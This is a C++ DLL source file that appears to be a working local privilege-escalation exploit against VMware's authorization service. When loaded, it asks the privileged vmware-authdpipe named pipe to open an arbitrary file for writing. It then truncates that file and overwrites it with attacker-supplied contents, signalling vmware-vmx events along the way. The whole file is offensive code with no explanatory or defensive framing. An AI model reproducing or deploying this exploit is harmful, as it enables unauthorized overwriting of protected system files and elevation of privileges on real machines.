// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <AclAPI.h>
#include <sddl.h>
#include <conio.h>
#include <shellapi.h>

#pragma warning(disable :4996)

HANDLE OpenSecurable(const char* file) {

    HANDLE hpipe = CreateFile(L"\\\\.\\pipe\\vmware-authdpipe", FILE_READ_DATA | FILE_WRITE_DATA, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hpipe == INVALID_HANDLE_VALUE) {
        printf("Error %d opening \\\\.\\pipe\\vmware-authdpipe.\n", GetLastError());
        return NULL;
    }
    
    int sz = snprintf(NULL, NULL, "opensecurable%s|1 %d %d %d %d %d", file, GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, GetCurrentProcessId());
    char* cmd = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sz + 1) * sizeof(char));
    sprintf(cmd, "opensecurable%s|1 %d %d %d %d %d", file, GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, GetCurrentProcessId());
    DWORD dw = 0;
    WriteFile(hpipe, cmd, strlen(cmd), &dw, NULL);
    
    char pipe_buff[4096];
    ReadFile(hpipe, pipe_buff, 4096, &dw, NULL);
    pipe_buff[dw] = '\0';
    char cmp2[6];
    memcpy(cmp2, pipe_buff, 5);
    cmp2[5] = '\0';
    if (stricmp(cmp2, "TOKEN")) {
        printf("Error : %s", pipe_buff);
        return NULL;
    }
    printf("response : \"%s\"\n", pipe_buff);
    DWORD handle_address = strtol(&pipe_buff[6], 0, 16);
    printf("HANDLE : 0x%x\n", handle_address);
    HeapFree(GetProcessHeap(), NULL, cmd);
    CloseHandle(hpipe);
    return (HANDLE)handle_address;
}


void Run() {
    
    HANDLE hevent = OpenEvent(EVENT_ALL_ACCESS, FALSE, L"vmware-vmx-success");
    HANDLE hevent2 = OpenEvent(EVENT_ALL_ACCESS, FALSE, L"vmware-vmx-end");
    if (hevent) {
        SetEvent(hevent);
        CloseHandle(hevent);
    }
    int argc = 0;
    LPWSTR* wargv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc != 4) {
        printf("Invalid arguments.");
        return;
    }
    char* argv = (char*)malloc((lstrlenW(wargv[3]) + 1) * sizeof(char));
    wcstombs(argv, wargv[3], (lstrlenW(wargv[3]) + 1) * sizeof(char));
    int separator = 0;
    for (int i = 0; i < strlen(argv); i++)
        if (argv[i] == '*')
            separator = i;
    char* argv1 = (char*)malloc(sizeof(char) * (separator + 2));
    memmove(argv1, argv, separator + 1);
    argv1[separator] = '\0';
    int separator2 = separator + 1;
    char* argv2 = (char*)malloc(sizeof(char) * ((lstrlenW(wargv[3]) - separator2) + 2));
    memmove(argv2, &argv[separator2], ((lstrlenW(wargv[3]) - separator2) + 2));
    argv2[((lstrlenW(wargv[3]) - separator2))] = '\0';
    
    HANDLE hfile = OpenSecurable(argv2);
    if (hfile == INVALID_HANDLE_VALUE) {
        free(argv);
        free(argv1);
        free(argv2);
        if (hevent2) {
            SetEvent(hevent2);
            CloseHandle(hevent2);
        }
        printf("OpenSecurable returned an invalid handle.");
        return;
    }
    FILE_END_OF_FILE_INFO eofi = { 0 };

    HANDLE hsrc = CreateFileA(argv1, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hsrc == INVALID_HANDLE_VALUE) {
        free(argv);
        free(argv2);
        printf("failed to open %s for reading, error : %d", argv1,GetLastError());
        free(argv1);
        if (hevent2) {
            SetEvent(hevent2);
            CloseHandle(hevent2);
        }
        return;
    }
    SetFileInformationByHandle(hfile, FileEndOfFileInfo, &eofi, sizeof(eofi));
    FILE_STANDARD_INFO fsi = { 0 };
    GetFileInformationByHandleEx(hsrc, FileStandardInfo, &fsi, sizeof(fsi));
    void* buff = malloc(fsi.EndOfFile.QuadPart);
    DWORD dw = 0;
    if (!ReadFile(hsrc, buff, fsi.EndOfFile.QuadPart, &dw, NULL)) {
        printf("ReadFile Failed : %d\n", GetLastError());
        free(buff);
        free(argv);
        free(argv1);
        free(argv2);
        CloseHandle(hsrc);
        CloseHandle(hfile);
        if (hevent2) {
            SetEvent(hevent2);
            CloseHandle(hevent2);
        }
        return;
    }
    if (!WriteFile(hfile, buff, fsi.EndOfFile.QuadPart, &dw, NULL)) {
        printf("WriteFile Failed : %d\n", GetLastError());
        free(buff);
        free(argv);
        free(argv1);
        free(argv2);
        CloseHandle(hsrc);
        CloseHandle(hfile);
        if (hevent2) {
            SetEvent(hevent2);
            CloseHandle(hevent2);
        }
        return;
    }
    CloseHandle(hfile);
    CloseHandle(hsrc);
    printf("Succesfully copied %s to %s\n", argv1, argv2);
    free(buff);
    free(argv);
    free(argv1);
    free(argv2);
    if (hevent2) {
        SetEvent(hevent2);
        CloseHandle(hevent2);
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        AllocConsole();
        FILE* fDummy;
        freopen_s(&fDummy, "CONIN$", "r", stdin);
        freopen_s(&fDummy, "CONOUT$", "w", stderr);
        freopen_s(&fDummy, "CONOUT$", "w", stdout);
        Run();
        printf("Press enter to exit...");
        _getch();
        FreeConsole();
        ExitProcess(1);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

